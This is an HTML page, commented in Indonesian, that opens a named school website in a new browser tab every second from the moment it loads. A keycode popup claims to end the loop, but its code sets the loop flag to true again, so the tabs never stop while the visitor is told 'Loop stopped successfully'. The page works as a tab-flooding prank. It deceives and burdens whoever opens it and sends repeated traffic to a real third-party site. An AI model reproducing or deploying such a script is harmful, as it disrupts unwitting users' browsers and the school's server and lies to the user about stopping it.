<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Web Loop with Keycode</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background-color: #f0f0f0;
    }
    #overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.5);
      display: flex;
      justify-content: center;
      align-items: center;
    }
    #popup {
      background: white;
      padding: 20px;
      border-radius: 8px;
      text-align: center;
      width: 300px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
    }
    #popup input {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 5px;
    }
    #popup button {
      padding: 10px 20px;
      background-color: #007BFF;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
    #popup button:hover {
      background-color: #0056b3;
    }
  </style>
  <script>
    let loopActive = true;

    // Fungsi untuk membuka laman web terus-menerus
    function openWebLoop() {
      if (loopActive) {
        window.open("http://smkn11malang.sch.id/old/", "_blank");
        setTimeout(openWebLoop, 1000); // Interval membuka laman setiap 1 detik
      }
    }

    // Fungsi untuk memvalidasi keycode
    function validateKeycode() {
      const inputKeycode = document.getElementById("keycodeInput").value;
      const correctKeycode = "12345"; // Ganti dengan keycode yang diinginkan

      if (inputKeycode === correctKeycode) {
        loopActive = true;
        alert("Loop stopped successfully.");
        document.getElementById("overlay").style.display = "none";
      } else {
        alert("Incorrect keycode. Please try again.");
      }
    }

    // Memulai loop saat laman dimuat
    window.onload = function () {
      openWebLoop();

      // Tampilkan popup langsung saat laman dimuat
      document.getElementById("overlay").style.display = "flex";
    };
  </script>
</head>
<body>
  <div id="overlay">
    <div id="popup">
      <h2>Enter Keycode</h2>
      <input type="text" id="keycodeInput" placeholder="Enter keycode here">
      <button onclick="validateKeycode()">Submit</button>
    </div>
  </div>
</body>
</html>
